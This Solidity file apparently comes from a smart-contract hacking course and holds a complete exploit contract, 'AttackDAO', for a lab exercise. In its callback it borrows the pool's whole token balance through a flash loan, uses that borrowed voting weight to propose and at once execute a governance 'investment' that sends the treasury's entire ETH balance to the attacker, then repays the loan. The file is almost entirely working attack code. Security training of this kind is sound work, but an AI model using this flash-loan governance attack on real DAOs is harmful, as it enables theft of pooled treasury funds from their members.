// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount) external;
}

interface IGovernance {
    function suggestInvestment(address _startup, uint256 _amount) external returns (uint256);
    function executeInvestment(uint256 investmentId) external;
}

/**
 * @title AttackDAO
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract AttackDAO {

    address immutable token;
    address immutable treasury;
    address immutable governance;
    address immutable pool;
    address immutable  owner;

    constructor(address _token, address _treasury, address _governance, address _pool) {
        token = _token;
        treasury = _treasury;
        governance = _governance;
        pool = _pool;
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");
        IPool(pool).flashLoan(IERC20(token).balanceOf(pool));
    }

    function callBack(uint borrowAmount) external {
        require(msg.sender == pool, "not pool");

        uint256 investmentId = IGovernance(governance).suggestInvestment(owner, treasury.balance);
        IGovernance(governance).executeInvestment(investmentId);

        IERC20(token).transfer(pool, borrowAmount);
    }

}